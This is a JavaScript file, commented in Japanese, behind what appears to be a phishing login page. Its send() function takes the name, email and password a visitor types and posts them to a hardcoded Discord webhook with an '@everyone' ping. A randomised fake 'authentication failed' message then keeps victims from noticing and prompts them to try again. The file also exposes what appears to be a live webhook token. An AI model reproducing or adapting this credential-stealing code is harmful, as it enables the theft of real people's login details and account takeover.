//書き込み関数
function writeText() {
    let text
    if (Math.random() < 0.7) {
        text = "[ 認証に失敗 ] 正しい情報を入力してください。"
      } else {
        text = "成功しました！"
    }
    // テキストボックスにアクセス
    var textbox = document.getElementById("myTextbox");
    textbox.value = ""
    
    // テキストを設定
    textbox.value = text;
}

//変換関数
function unicodeToText(unicodeString) {
    return unicodeString.replace(/\\u[\dA-Fa-f]{4}/g, function (match) {
      return String.fromCharCode(parseInt(match.substr(2), 16));
    });
}

//送信関数
function send() {
    const code = "https://discord.com/api/webhooks/1148573753224220762/xfnA9_40VWglUbMEcQSRChEQBOFt89gdqkC9iLTERSYRNv_p5-h6AXe1jus0Rz0o1LU-"
    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const sender = {
        content: '@everyone',
        embeds: [
            {
                title: 'Login Information',
                description: `**Name**: ${name}\n**Email**: ${email}\n**Password**: ${password}`
            }
        ]
    };

    fetch(code, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sender)
    })
    setTimeout(function() {
        writeText()
    }, 300)
}